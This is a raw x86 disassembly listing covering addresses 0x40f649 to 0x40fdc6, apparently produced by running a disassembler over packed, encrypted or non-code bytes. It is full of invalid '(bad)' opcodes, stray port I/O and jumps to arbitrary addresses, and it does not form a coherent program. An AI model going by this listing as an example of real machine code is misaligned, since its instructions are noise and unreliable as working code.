  40f649:	rol    dl,cl
  40f64b:	jp     0x40f5e9
  40f64d:	dec    edx
  40f64e:	pop    ss
  40f64f:	mov    esp,0x9a5dcff
  40f654:	jbe    0x40f64a
  40f656:	adc    eax,0xe774f132
  40f65b:	sub    BYTE PTR [edi],bh
  40f65d:	mov    ebx,0x4669b485
  40f662:	sbb    ah,BYTE PTR [ebx+0x2]
  40f665:	dec    ebx
  40f666:	sbb    ebx,DWORD PTR [edx-0xe0fcf6d]
  40f66c:	enter  0x468e,0xc4
  40f670:	in     al,dx
  40f671:	dec    esp
  40f672:	in     al,0xc8
  40f674:	xor    BYTE PTR [ebp+0x3b1904f3],al
  40f67a:	repnz lods al,BYTE PTR ds:[esi]
  40f67c:	cdq    
  40f67d:	pop    ecx
  40f67e:	shl    dl,1
  40f680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f681:	jo     0x40f688
  40f683:	loop   0x40f65e
  40f685:	adc    eax,0xb285777a
  40f68a:	call   0xb8b0adae
  40f68f:	xchg   esi,eax
  40f690:	adc    bh,ch
  40f692:	jle    0x40f640
  40f694:	and    bl,BYTE PTR [eax+ebx*4]
  40f697:	aaa    
  40f698:	(bad)  
  40f69a:	arpl   cx,sp
  40f69c:	loopne 0x40f6be
  40f69e:	ins    DWORD PTR es:[edi],dx
  40f69f:	xchg   ebx,eax
  40f6a0:	jg     0x40f6ec
  40f6a2:	out    dx,eax
  40f6a3:	sbb    eax,0x8a18f579
  40f6a8:	rcr    BYTE PTR [eax-0x54],0xbe
  40f6ac:	jmp    0x40f684
  40f6ae:	aad    0x72
  40f6b0:	push   DWORD PTR [ecx]
  40f6b2:	fldenv [di]
  40f6b5:	daa    
  40f6b6:	aaa    
  40f6b7:	sbb    eax,0x7e7c31de
  40f6bc:	jl     0x40f6d7
  40f6be:	lahf   
  40f6bf:	fwait
  40f6c0:	cmp    ch,dl
  40f6c2:	add    al,0xbb
  40f6c4:	mov    ebx,0xf1f1f2ad
  40f6c9:	mov    ds:0x6dbb710f,eax
  40f6ce:	mov    BYTE PTR [ecx-0x56],ch
  40f6d1:	or     cl,BYTE PTR [eax]
  40f6d3:	int3   
  40f6d4:	xchg   ecx,eax
  40f6d5:	js     0x40f6b9
  40f6d7:	jnp    0x40f6e3
  40f6d9:	mov    ebp,0x5cdff6f8
  40f6de:	stos   BYTE PTR es:[edi],al
  40f6df:	inc    ecx
  40f6e0:	mov    dh,0xce
  40f6e2:	jmp    0x40f758
  40f6e4:	jne    0x40f686
  40f6e6:	rol    bh,cl
  40f6e8:	(bad)  
  40f6e9:	loope  0x40f708
  40f6eb:	mul    BYTE PTR [eax]
  40f6ed:	push   0xf1ff7878
  40f6f2:	dec    esi
  40f6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6f4:	mov    ds:0x88594be7,al
  40f6f9:	inc    edx
  40f6fa:	test   eax,0xeb817d10
  40f6ff:	xchg   ecx,eax
  40f700:	and    DWORD PTR [eax+0x20632edc],ebp
  40f706:	(bad)  
  40f707:	retf   
  40f708:	sar    BYTE PTR [esi-0x62],0xc9
  40f70c:	xchg   BYTE PTR [edi+0x2a40b3a0],bh
  40f712:	jo     0x40f6aa
  40f714:	mov    ebp,0x31a967ba
  40f719:	lock add eax,0xd9e5aca3
  40f71f:	cwde   
  40f720:	cmp    eax,0x5f7c740b
  40f725:	pop    ebx
  40f726:	xchg   esi,eax
  40f727:	jns    0x40f79b
  40f729:	daa    
  40f72a:	sbb    ah,BYTE PTR [ecx-0x32]
  40f72d:	xor    eax,0x23209a0e
  40f732:	jbe    0x40f70c
  40f734:	les    esp,FWORD PTR [ebp-0x1d]
  40f737:	loope  0x40f751
  40f739:	push   edi
  40f73a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f73b:	test   al,0xe6
  40f73d:	push   ebx
  40f73e:	fisub  DWORD PTR ds:[edi+0x761b4d36]
  40f745:	mov    bl,0xb7
  40f747:	stc    
  40f748:	mov    WORD PTR [edx-0x4230e513],ss
  40f74e:	lods   al,BYTE PTR ds:[esi]
  40f74f:	repnz outs dx,DWORD PTR ds:[esi]
  40f751:	dec    esp
  40f752:	shl    ebp,cl
  40f754:	and    bh,0x1a
  40f757:	aad    0xfc
  40f759:	inc    esp
  40f75a:	cmp    ebp,eax
  40f75c:	sbb    eax,0x762e5a00
  40f761:	cmc    
  40f762:	hlt    
  40f763:	loope  0x40f6fb
  40f765:	cwde   
  40f766:	iret   
  40f767:	outs   dx,BYTE PTR ds:[esi]
  40f768:	icebp  
  40f769:	sbb    eax,0x39d17be7
  40f76e:	mov    ebx,0x8bb80afd
  40f773:	out    dx,eax
  40f774:	in     eax,dx
  40f775:	in     al,dx
  40f776:	arpl   WORD PTR [ebx+0x7bde260b],ax
  40f77c:	push   esi
  40f77d:	imul   esi,DWORD PTR [edi-0x4dc35ff6],0x1d
  40f784:	out    dx,eax
  40f785:	scas   al,BYTE PTR es:[edi]
  40f786:	retf   0x7f33
  40f789:	sub    eax,0x8009bdd
  40f78e:	out    dx,al
  40f78f:	je     0x40f7f7
  40f791:	inc    esi
  40f792:	test   eax,0xc3d03ba3
  40f797:	imul   edx,DWORD PTR [ebx-0x1b],0x7d
  40f79b:	in     al,dx
  40f79c:	mov    WORD PTR [ecx-0x592a1ea9],ds
  40f7a2:	in     al,dx
  40f7a3:	xor    DWORD PTR ds:0x292664a1,edi
  40f7a9:	(bad)  
  40f7aa:	(bad)  
  40f7ab:	fst    QWORD PTR [esi+0x1e]
  40f7ae:	addr16 js 0x40f7a1
  40f7b1:	sbb    eax,0x36206d0a
  40f7b6:	mov    eax,0xd722c8d4
  40f7bb:	inc    ecx
  40f7bc:	popa   
  40f7bd:	cmp    BYTE PTR [ebp+0x6ad83957],al
  40f7c3:	inc    esp
  40f7c4:	(bad)  
  40f7c5:	push   ss
  40f7c6:	and    eax,0x4141416
  40f7cb:	sub    al,0x7b
  40f7cd:	pop    ebx
  40f7ce:	pusha  
  40f7cf:	pop    esp
  40f7d0:	imul   dl
  40f7d2:	std    
  40f7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7d4:	(bad)  
  40f7d5:	das    
  40f7d6:	jnp    0x40f855
  40f7d8:	pop    ss
  40f7d9:	sub    al,0x76
  40f7db:	mov    esi,0x14012bb1
  40f7e0:	and    DWORD PTR [esi],esp
  40f7e2:	add    eax,0xcad258b
  40f7e7:	in     al,dx
  40f7e8:	jecxz  0x40f783
  40f7ea:	cmp    BYTE PTR [ecx],ah
  40f7ec:	xchg   ebx,eax
  40f7ed:	cmp    ecx,ecx
  40f7ef:	jg     0x40f846
  40f7f1:	ins    BYTE PTR es:[edi],dx
  40f7f2:	jl     0x40f7f3
  40f7f4:	(bad)  
  40f7f5:	fnclex 
  40f7f7:	or     ch,BYTE PTR [edx]
  40f7f9:	push   edx
  40f7fa:	outs   dx,DWORD PTR ds:[esi]
  40f7fb:	fcmovb st,st(1)
  40f7fd:	repnz mov ds:0xc5cd4cd,eax
  40f803:	jl     0x40f875
  40f805:	sar    dh,0xea
  40f808:	popf   
  40f809:	test   BYTE PTR [edi-0x2c6aae4d],ah
  40f80f:	and    eax,0xe097d02c
  40f814:	push   0x8afad104
  40f819:	loopne 0x40f88d
  40f81b:	fisub  DWORD PTR [eax+ecx*4-0x20]
  40f81f:	xor    ebx,esi
  40f821:	mov    al,ds:0x3bb28d06
  40f826:	je     0x40f883
  40f828:	jmp    0x40f849
  40f82a:	add    BYTE PTR [ebp+0x5a6c8603],ch
  40f830:	fimul  WORD PTR [eax]
  40f832:	fistp  DWORD PTR [ebp+0x59c6e507]
  40f838:	jns    0x40f7c6
  40f83a:	inc    edi
  40f83b:	sub    DWORD PTR [edi-0x5533d4ce],esi
  40f841:	inc    esi
  40f842:	dec    si
  40f844:	les    esi,FWORD PTR [edx]
  40f846:	fs (bad) 
  40f848:	cmp    ebp,DWORD PTR [esi]
  40f84a:	std    
  40f84b:	div    esi
  40f84d:	pop    ebp
  40f84e:	mov    ah,0x94
  40f850:	push   es
  40f851:	mov    ebp,eax
  40f853:	ret    0xf518
  40f856:	jg     0x40f81f
  40f858:	mov    ebx,0x8b3bd183
  40f85d:	in     eax,0xf7
  40f85f:	jb     0x40f813
  40f861:	inc    esi
  40f862:	jne    0x40f8c6
  40f864:	out    dx,al
  40f865:	push   ss
  40f866:	jbe    0x40f837
  40f868:	sbb    eax,0xb038574a
  40f86d:	xor    BYTE PTR fs:[esi-0x1bf3be9c],al
  40f874:	fmul   st,st(1)
  40f876:	xor    bl,BYTE PTR [eax]
  40f878:	bound  ecx,QWORD PTR [ebx-0x46f5ea76]
  40f87e:	sahf   
  40f87f:	or     cl,BYTE PTR [edi-0x12d96e12]
  40f885:	xor    al,0x3e
  40f887:	add    eax,0x5a79834
  40f88c:	shr    BYTE PTR [edx-0x522222c8],1
  40f892:	outs   dx,BYTE PTR ds:[esi]
  40f893:	fstp   QWORD PTR ss:[ebx]
  40f896:	lahf   
  40f897:	lods   al,BYTE PTR ds:[esi]
  40f898:	jl     0x40f81f
  40f89a:	out    dx,eax
  40f89b:	add    esp,DWORD PTR [ebp+0x3]
  40f89e:	bound  edi,QWORD PTR [ebp+0x3a3cfbfb]
  40f8a4:	std    
  40f8a5:	gs nop
  40f8a7:	push   edx
  40f8a8:	sbb    eax,0x428bc022
  40f8ad:	pop    edi
  40f8ae:	inc    eax
  40f8af:	(bad)  
  40f8b0:	shl    DWORD PTR [esi],1
  40f8b2:	mov    ecx,DWORD PTR [ecx+eiz*8+0x47]
  40f8b6:	rcl    DWORD PTR ds:0xc9da2d5b,cl
  40f8bc:	adc    eax,0x9afd0082
  40f8c1:	adc    bh,ah
  40f8c3:	mov    bh,0x25
  40f8c6:	mov    eax,0x3b8e823e
  40f8cb:	bswap  edx
  40f8cd:	stc    
  40f8ce:	cmp    al,0x9
  40f8d0:	add    ebp,ebx
  40f8d2:	ror    ah,cl
  40f8d4:	jp     0x40f8ca
  40f8d6:	xchg   esi,eax
  40f8d7:	in     eax,0x53
  40f8d9:	es ja  0x40f8a5
  40f8dc:	dec    esp
  40f8dd:	in     eax,dx
  40f8de:	inc    esp
  40f8df:	ror    BYTE PTR [esi+eiz*4],0xc3
  40f8e3:	add    al,0x88
  40f8e6:	dec    ebx
  40f8e7:	fst    st(1)
  40f8e9:	jg     0x40f90f
  40f8eb:	sbb    DWORD PTR [edi-0x3f],ebp
  40f8ee:	ins    DWORD PTR es:[edi],dx
  40f8ef:	gs add al,ch
  40f8f2:	mov    ebx,0x4e725afd
  40f8f7:	cld    
  40f8f8:	sti    
  40f8f9:	adc    eax,0x67f693d4
  40f8fe:	jl     0x40f8ae
  40f900:	sti    
  40f901:	adc    al,0x84
  40f903:	test   ecx,ecx
  40f905:	add    al,0xd9
  40f907:	(bad)
  40f90a:	int3   
  40f90b:	jne    0x40f8d6
  40f90d:	push   0xb134c2d1
  40f912:	iret   
  40f913:	jmp    0x10a8:0xea9336fc
  40f91a:	data16 test al,0x3c
  40f91d:	and    eax,0xf681542c
  40f922:	js     0x40f986
  40f924:	pop    eax
  40f925:	int3   
  40f926:	mov    eax,0xa2199541
  40f92b:	data16 adc BYTE PTR [ebx],0x44
  40f92f:	into   
  40f930:	fistp  DWORD PTR [edi-0x33]
  40f933:	push   0x2f
  40f935:	adc    esi,DWORD PTR [ecx]
  40f937:	imul   edx,DWORD PTR [ebp-0x10d83c07],0x62
  40f93e:	fwait
  40f93f:	and    DWORD PTR [ebx+0x13],ebx
  40f942:	inc    esi
  40f943:	into   
  40f944:	stc    
  40f945:	(bad)  
  40f947:	nop
  40f948:	mov    ah,0x4e
  40f94a:	push   esi
  40f94b:	pop    eax
  40f94c:	addr16 (bad) 
  40f94e:	sub    dl,ch
  40f950:	lea    ebp,[eax-0x5c155a84]
  40f956:	add    bh,BYTE PTR [edi-0x2e]
  40f959:	jp     0x40f9c9
  40f95b:	daa    
  40f95c:	sbb    al,0xde
  40f95e:	push   0x56
  40f960:	push   ds
  40f961:	inc    ecx
  40f962:	xor    BYTE PTR [esi+0x4256d2a0],ch
  40f968:	es adc bl,ch
  40f96b:	(bad)  [ebx+0x15]
  40f96e:	add    DWORD PTR [eax-0x430e0d81],eax
  40f974:	sbb    al,0xa
  40f976:	(bad)  
  40f977:	xchg   esp,eax
  40f978:	mov    ds:0xc45311c6,al
  40f97d:	imul   ebp,DWORD PTR [edi+0x356ca7e9],0x35
  40f984:	(bad)  
  40f987:	mov    esi,0xba868845
  40f98c:	xor    eax,0x2ecd2996
  40f991:	test   DWORD PTR [ebp+0x69d8fb5e],0xa41cd5d0
  40f99b:	scas   al,BYTE PTR es:[edi]
  40f99c:	cmp    DWORD PTR [esi-0x32afabd6],ebx
  40f9a2:	push   ebp
  40f9a3:	popa   
  40f9a4:	mov    ecx,0xa59c8e4f
  40f9a9:	sti    
  40f9aa:	arpl   WORD PTR [ecx+0x3b],sp
  40f9ad:	xchg   BYTE PTR [ecx-0xd],ch
  40f9b0:	int    0x9e
  40f9b2:	retf   0xc15a
  40f9b5:	inc    ebp
  40f9b6:	ins    DWORD PTR es:[edi],dx
  40f9b7:	aaa    
  40f9b8:	xchg   DWORD PTR [ecx+0x33],ebp
  40f9bb:	mov    al,0xce
  40f9bd:	adc    eax,0x64faa166
  40f9c2:	mov    ebp,0xf96d430f
  40f9c7:	jmp    0x68997bc6
  40f9cc:	arpl   WORD PTR [edi+esi*1],si
  40f9cf:	retf   
  40f9d0:	int3   
  40f9d1:	push   0x8747bae1
  40f9d6:	sahf   
  40f9d7:	dec    eax
  40f9d8:	xor    al,0xad
  40f9da:	das    
  40f9db:	mov    esi,0x7c58f043
  40f9e0:	xor    ecx,esi
  40f9e2:	push   ebp
  40f9e3:	nop
  40f9e4:	mov    dl,0x81
  40f9e6:	and    al,bl
  40f9e8:	cmp    esp,DWORD PTR [esi]
  40f9ea:	pop    ss
  40f9eb:	lods   eax,DWORD PTR ds:[esi]
  40f9ec:	addr16 int 0x8f
  40f9ef:	mov    eax,ds:0x296c8acb
  40f9f4:	imul   ecx,DWORD PTR ss:0xb45d5ec0,0xeed5c059
  40f9ff:	retf   0xc8b3
  40fa02:	push   ebp
  40fa03:	inc    esp
  40fa04:	fild   DWORD PTR [edx+0x30]
  40fa07:	lods   eax,DWORD PTR ds:[esi]
  40fa08:	push   ecx
  40fa09:	push   ecx
  40fa0a:	(bad)  
  40fa0b:	push   cs
  40fa0c:	mov    bl,BYTE PTR [eax]
  40fa0e:	lahf   
  40fa0f:	jl     0x40f9ed
  40fa11:	ret    0xee5b
  40fa14:	adc    eax,0xabc6b8a
  40fa19:	mov    ecx,0x5836510f
  40fa1e:	lea    eax,[edi-0x38]
  40fa21:	icebp  
  40fa22:	lods   eax,DWORD PTR ds:[esi]
  40fa23:	sbb    DWORD PTR [esi-0x6e],eax
  40fa26:	and    eax,0xa625c1ff
  40fa2b:	inc    edi
  40fa2c:	mov    ebx,0x9668d478
  40fa31:	jmp    0x77663532
  40fa36:	sub    DWORD PTR [edi],edx
  40fa38:	and    BYTE PTR [edi+0x2be1f6de],bl
  40fa3e:	iret   
  40fa3f:	mov    al,0x27
  40fa41:	or     eax,ecx
  40fa43:	sub    bl,BYTE PTR [edi+0x65b3e084]
  40fa49:	push   0x30
  40fa4b:	adc    al,0x9
  40fa4d:	xlat   BYTE PTR ds:[ebx]
  40fa4e:	xchg   edi,eax
  40fa4f:	sbb    edx,DWORD PTR [ebp+0x49fc47d8]
  40fa55:	sub    eax,0x71a36c1c
  40fa5a:	xchg   DWORD PTR [eax+0x32],ebx
  40fa5d:	ins    DWORD PTR es:[edi],dx
  40fa5e:	sbb    BYTE PTR [eax+0x2c],cl
  40fa61:	mov    ebx,0x6b758088
  40fa66:	add    ah,cl
  40fa68:	xchg   ebp,eax
  40fa69:	mov    edi,0xa1e92b1c
  40fa6e:	adc    ebp,DWORD PTR [eax+0x27f99537]
  40fa74:	mov    edx,0x6ff6d229
  40fa79:	mov    ebx,0xd2dbb74f
  40fa7e:	sahf   
  40fa7f:	je     0x40faa7
  40fa81:	div    BYTE PTR [eax+0x75c14f6c]
  40fa87:	outs   dx,DWORD PTR ds:[esi]
  40fa88:	cmp    DWORD PTR [eax],ecx
  40fa8a:	retf   0xb16f
  40fa8d:	or     BYTE PTR [edi+0x734df97a],ch
  40fa93:	mov    BYTE PTR [esi+0x29850825],ah
  40fa99:	mov    cl,0x28
  40fa9b:	add    eax,ebx
  40fa9d:	das    
  40fa9e:	push   ebx
  40fa9f:	cmp    dl,0x1f
  40faa2:	out    0x95,al
  40faa4:	cwde   
  40faa5:	cwde   
  40faa6:	add    eax,DWORD PTR [ebx+0x53829c3a]
  40faac:	aaa    
  40faad:	xor    edx,eax
  40faaf:	test   eax,0xff14110f
  40fab4:	sub    esp,edx
  40fab6:	test   bh,bh
  40fab8:	sbb    ecx,DWORD PTR [ebp+0x60fda290]
  40fabe:	pop    DWORD PTR [ecx+edi*1-0x11]
  40fac2:	rcr    DWORD PTR [edx],0x9
  40fac5:	(bad)  
  40fac6:	nop
  40fac7:	test   DWORD PTR [esi],eax
  40fac9:	std    
  40faca:	enter  0xa738,0x9a
  40face:	(bad)  
  40facf:	push   ecx
  40fad0:	adc    eax,0xdeef24eb
  40fad5:	xor    dl,0x9b
  40fad8:	popf   
  40fad9:	xor    eax,esp
  40fadb:	dec    ebx
  40fadc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fadd:	scas   eax,DWORD PTR es:[edi]
  40fade:	(bad)  
  40fadf:	loope  0x40fa74
  40fae1:	sub    eax,0x9b5e697f
  40fae6:	jl     0x40fb2a
  40fae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fae9:	les    esi,FWORD PTR [ebx+edx*2]
  40faec:	mov    ch,0xb1
  40faee:	out    dx,eax
  40faef:	sub    al,0xa6
  40faf1:	(bad)  
  40faf2:	out    0x5f,al
  40faf4:	xor    eax,0x3e55e97c
  40faf9:	mov    ds:0x8add800f,eax
  40fafe:	or     esp,DWORD PTR [esi-0x70]
  40fb01:	ror    bh,cl
  40fb03:	adc    BYTE PTR [eax-0x1a],bl
  40fb06:	or     DWORD PTR [esi-0x48d04ff8],edi
  40fb0c:	loope  0x40fb2e
  40fb0e:	sub    bl,ah
  40fb10:	sub    al,0x94
  40fb12:	das    
  40fb13:	stos   BYTE PTR es:[edi],al
  40fb14:	fdivr  DWORD PTR [ecx+0x171876f5]
  40fb1a:	dec    esp
  40fb1b:	push   0xffffff8e
  40fb1d:	int    0x46
  40fb1f:	rcr    DWORD PTR [edx+edi*8-0x900a522],1
  40fb26:	add    eax,0x801b3870
  40fb2b:	fwait
  40fb2c:	xchg   edx,eax
  40fb2d:	jbe    0x40fb3f
  40fb2f:	fdivr  QWORD PTR [ebx]
  40fb31:	out    dx,al
  40fb32:	sub    DWORD PTR [ebx],edx
  40fb34:	mov    dl,0xf
  40fb36:	mov    al,ds:0x60c244fa
  40fb3b:	jns    0x40fb2d
  40fb3d:	rcl    DWORD PTR ds:0x8d0a861e,0x9c
  40fb44:	xor    DWORD PTR [ebp-0x54],edx
  40fb47:	mov    eax,0xa774b9f7
  40fb4c:	xchg   DWORD PTR [edx],ecx
  40fb4e:	imul   esi,DWORD PTR [edx],0xe687a9c4
  40fb54:	xor    ebx,ebx
  40fb56:	or     DWORD PTR [esp+ecx*8+0x2f],ebp
  40fb5a:	xor    BYTE PTR [edx-0x723102ab],dl
  40fb60:	jae    0x40fb4d
  40fb62:	mov    bh,0xb6
  40fb64:	xchg   ecx,eax
  40fb65:	jecxz  0x40faef
  40fb67:	shl    BYTE PTR [eax+0x4e],cl
  40fb6a:	aas    
  40fb6b:	lea    ebx,ds:0x4956bbd8
  40fb71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb72:	lods   eax,DWORD PTR ds:[esi]
  40fb73:	jo     0x40fbb4
  40fb75:	dec    edi
  40fb76:	imul   ebx,DWORD PTR [ecx*1+0x62bd67e3],0x54da1825
  40fb81:	mov    bl,0xb8
  40fb83:	retf   
  40fb84:	add    BYTE PTR [edi+0x7b],0x55
  40fb88:	or     DWORD PTR [ebp-0x39],edi
  40fb8b:	sbb    al,0xed
  40fb8d:	daa    
  40fb8e:	and    eax,0x5cecce8a
  40fb93:	aaa    
  40fb94:	push   esp
  40fb95:	das    
  40fb96:	add    DWORD PTR [ebx],0xffffff86
  40fb99:	pop    edx
  40fb9a:	(bad)  
  40fb9c:	cld    
  40fb9d:	retf   0xbdec
  40fba0:	inc    edx
  40fba1:	psubw  mm2,QWORD PTR [ecx-0x5d]
  40fba5:	or     BYTE PTR [esi+0x2e53364e],0x70
  40fbac:	and    BYTE PTR [ebp+0x3a],0x41
  40fbb0:	(bad)  
  40fbb2:	enter  0x8f0d,0x3c
  40fbb6:	sar    DWORD PTR [ecx+0x1763c519],cl
  40fbbc:	sbb    edx,ebp
  40fbbe:	add    ebx,DWORD PTR [ebx+0x41dee43a]
  40fbc4:	pop    edi
  40fbc5:	inc    BYTE PTR [esi]
  40fbc7:	cmp    esp,ebx
  40fbc9:	lea    ecx,[esp+ebp*1-0x52]
  40fbcd:	out    dx,eax
  40fbce:	imul   eax,DWORD PTR [esi],0xd68d1cbd
  40fbd4:	add    BYTE PTR [ebx],al
  40fbd6:	icebp  
  40fbd7:	mov    bl,0x5b
  40fbd9:	enter  0xc1ca,0xbe
  40fbdd:	push   ds
  40fbde:	jns    0x40fbb9
  40fbe0:	or     al,0x3a
  40fbe2:	arpl   WORD PTR [esi+0x1ba016bb],cx
  40fbe8:	add    BYTE PTR [edx],bh
  40fbea:	jb     0x40fbda
  40fbec:	imul   ecx,DWORD PTR ds:[edx-0x397ad6b6],0xffffff81
  40fbf4:	pop    ds
  40fbf5:	pop    ds
  40fbf6:	mov    bh,0xe5
  40fbf8:	(bad)  [ecx]
  40fbfa:	dec    edx
  40fbfb:	iret   
  40fbfc:	push   ebx
  40fbfd:	xlat   BYTE PTR ds:[ebx]
  40fbfe:	push   ecx
  40fbff:	aaa    
  40fc00:	gs ja  0x40fb87
  40fc03:	mov    ebp,0x7894d74c
  40fc08:	sbb    ebx,DWORD PTR [edx]
  40fc0a:	mov    edx,0xfe9c3083
  40fc0f:	fiadd  DWORD PTR [ecx+0x7]
  40fc12:	and    ebp,DWORD PTR [edi+0x45]
  40fc15:	push   0x18c49245
  40fc1a:	mov    edi,0x869f096
  40fc1f:	daa    
  40fc20:	xchg   BYTE PTR [ebx],dh
  40fc22:	in     eax,0x7e
  40fc24:	jmp    0xaf4e9d84
  40fc29:	fcomp  DWORD PTR [eax-0x37]
  40fc2c:	dec    ecx
  40fc2d:	les    esi,FWORD PTR [ebp-0x1c7371a8]
  40fc33:	in     al,0xcd
  40fc35:	sub    eax,0xfe7f087
  40fc3a:	push   ebp
  40fc3b:	aas    
  40fc3c:	mov    dh,0xf9
  40fc3e:	sahf   
  40fc3f:	sar    BYTE PTR [ebp-0x260c68b3],0x3f
  40fc46:	jmp    0x4d2d:0x273481c7
  40fc4d:	or     BYTE PTR [ecx-0x19],bl
  40fc50:	dec    edx
  40fc51:	ficomp WORD PTR ss:[bx+di-0x30]
  40fc56:	xchg   ebp,eax
  40fc57:	shl    BYTE PTR [edx],cl
  40fc59:	push   esi
  40fc5a:	xor    eax,0xd87a9245
  40fc5f:	in     al,dx
  40fc60:	mov    edx,0xa8b98818
  40fc65:	mov    ebx,?
  40fc67:	repz leave 
  40fc69:	jmp    0x40fc56
  40fc6b:	loop   0x40fbf7
  40fc6d:	jns    0x40fccc
  40fc6f:	lds    esp,FWORD PTR [edx+0x3d]
  40fc72:	jmp    FWORD PTR [ecx+edi*4-0x518f61d2]
  40fc79:	sub    edx,esi
  40fc7b:	popf   
  40fc7c:	lods   eax,DWORD PTR ds:[esi]
  40fc7d:	sbb    ch,BYTE PTR [ecx]
  40fc7f:	mov    esi,0x4ec8189a
  40fc84:	aas    
  40fc85:	hlt    
  40fc86:	sub    esi,DWORD PTR [esi-0x59]
  40fc89:	out    dx,eax
  40fc8a:	out    dx,eax
  40fc8b:	ds cwde 
  40fc8d:	dec    ebp
  40fc8e:	mov    ?,WORD PTR [ecx+0x47]
  40fc91:	adc    bl,ah
  40fc93:	hlt    
  40fc94:	jl     0x40fc4f
  40fc96:	retf   0x70da
  40fc99:	popf   
  40fc9a:	inc    edx
  40fc9b:	retf   0x12d1
  40fc9e:	popf   
  40fc9f:	nop
  40fca0:	scas   eax,DWORD PTR es:[edi]
  40fca1:	add    esp,DWORD PTR [eax+0x424263c5]
  40fca7:	leave  
  40fca8:	test   BYTE PTR [ecx+0x26],ch
  40fcab:	test   BYTE PTR [eax-0x7e],cl
  40fcae:	push   ss
  40fcaf:	sbb    edi,esi
  40fcb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcb2:	mov    bh,0x61
  40fcb4:	stc    
  40fcb5:	push   eax
  40fcb6:	in     al,dx
  40fcb7:	jp     0x40fcb7
  40fcb9:	out    0x87,al
  40fcbb:	jle    0x40fced
  40fcbd:	hlt    
  40fcbe:	xor    BYTE PTR [esi],dh
  40fcc0:	push   cs
  40fcc1:	mov    bl,0xb0
  40fcc3:	sub    esi,DWORD PTR [eax+ebx*4]
  40fcc6:	pop    ss
  40fcc7:	in     al,dx
  40fcc8:	mov    ah,0xb5
  40fcca:	dec    edi
  40fccb:	add    BYTE PTR [ebp+0x45],dl
  40fcce:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40fcd0:	mov    eax,ds:0x45fce2f3
  40fcd5:	jne    0x40fcf1
  40fcd7:	lods   eax,DWORD PTR ds:[esi]
  40fcd8:	ds push ebx
  40fcda:	mov    edx,0x7a6839ca
  40fcdf:	bound  eax,QWORD PTR [ecx+0x3c]
  40fce2:	gs xchg esp,eax
  40fce4:	shr    DWORD PTR [ebp-0x75b15f55],cl
  40fcea:	and    ecx,DWORD PTR [esi+0x5e]
  40fced:	cmp    BYTE PTR [edi+0x7e16a25f],cl
  40fcf3:	pop    ds
  40fcf4:	cdq    
  40fcf5:	outs   dx,BYTE PTR ds:[esi]
  40fcf6:	fist   DWORD PTR [edi+0x46f245c4]
  40fcfc:	(bad)  
  40fcfd:	push   ss
  40fcfe:	repz scas eax,DWORD PTR es:[edi]
  40fd00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd01:	cmp    al,0x48
  40fd03:	stc    
  40fd04:	xor    edi,edx
  40fd06:	cld    
  40fd07:	cmp    BYTE PTR [ecx-0x7b812ca0],bh
  40fd0d:	mul    BYTE PTR [eax]
  40fd0f:	xlat   BYTE PTR ds:[ebx]
  40fd10:	cmc    
  40fd11:	xchg   esp,eax
  40fd12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd13:	cli    
  40fd14:	lods   al,BYTE PTR ds:[esi]
  40fd15:	in     al,0xca
  40fd17:	sbb    dh,BYTE PTR [ebp-0x6a]
  40fd1a:	ror    BYTE PTR [eax],cl
  40fd1c:	or     eax,0x24a5e472
  40fd21:	mov    ebp,DWORD PTR [edi-0x74]
  40fd24:	adc    DWORD PTR [esi+0xd],0xe
  40fd28:	fld    QWORD PTR [edx+0x1d]
  40fd2b:	pop    ecx
  40fd2c:	aas    
  40fd2d:	stos   DWORD PTR es:[edi],eax
  40fd2e:	std    
  40fd2f:	xchg   ebp,eax
  40fd30:	arpl   WORD PTR ds:0x9a063e4b,si
  40fd36:	(bad)  
  40fd37:	leave  
  40fd38:	inc    edi
  40fd39:	lods   eax,DWORD PTR ds:[esi]
  40fd3a:	das    
  40fd3b:	inc    ebp
  40fd3c:	xchg   DWORD PTR [edi+0x276c47ab],ebx
  40fd42:	call   0x1754e4b3
  40fd47:	push   0x437fcfa0
  40fd4c:	stos   DWORD PTR es:[edi],eax
  40fd4d:	iret   
  40fd4e:	ret    0x8db9
  40fd51:	out    0xe0,eax
  40fd53:	fwait
  40fd54:	hlt    
  40fd55:	fimul  WORD PTR [edi]
  40fd57:	mov    ecx,0xcb8d95f9
  40fd5c:	mov    edx,0x55405ecc
  40fd61:	push   ds
  40fd62:	popa   
  40fd63:	cmp    eax,0x5fe6a951
  40fd68:	enter  0x6ab,0xb9
  40fd6c:	sbb    DWORD PTR [edx+0x7e],ebx
  40fd6f:	xor    eax,0xe7ee3ce9
  40fd74:	iret   
  40fd75:	adc    al,0xa2
  40fd77:	push   ds
  40fd78:	lock popa 
  40fd7a:	inc    ecx
  40fd7b:	out    dx,eax
  40fd7c:	cld    
  40fd7d:	rcl    esp,0x56
  40fd80:	xchg   edx,eax
  40fd81:	mov    ah,0x6d
  40fd83:	cdq    
  40fd84:	mov    gs,WORD PTR [esi-0xd41ea4e]
  40fd8a:	add    DWORD PTR [esi],eax
  40fd8c:	cmp    DWORD PTR [ebx+0x4a],ebp
  40fd8f:	xor    DWORD PTR [edi],esi
  40fd91:	pop    esp
  40fd92:	xor    bl,ch
  40fd94:	mov    ebp,0x29972d6d
  40fd99:	fld    QWORD PTR [edi+edi*4+0x57]
  40fd9d:	test   eax,0x89c41a79
  40fda2:	xchg   esi,eax
  40fda3:	xor    DWORD PTR [edi],edx
  40fda5:	sbb    dl,dl
  40fda7:	repnz repnz cli 
  40fdaa:	(bad)  
  40fdab:	fisttp QWORD PTR [esi+0x79]
  40fdae:	cld    
  40fdaf:	cmc    
  40fdb0:	cmovs  sp,bp
  40fdb4:	sar    DWORD PTR [ebp-0x561ef24f],cl
  40fdba:	xchg   DWORD PTR [eax+0x7963b493],edx
  40fdc0:	loopne 0x40fe24
  40fdc2:	ss mov dh,0xf9
  40fdc5:	cli    
  40fdc6:	jne    0x40fd52
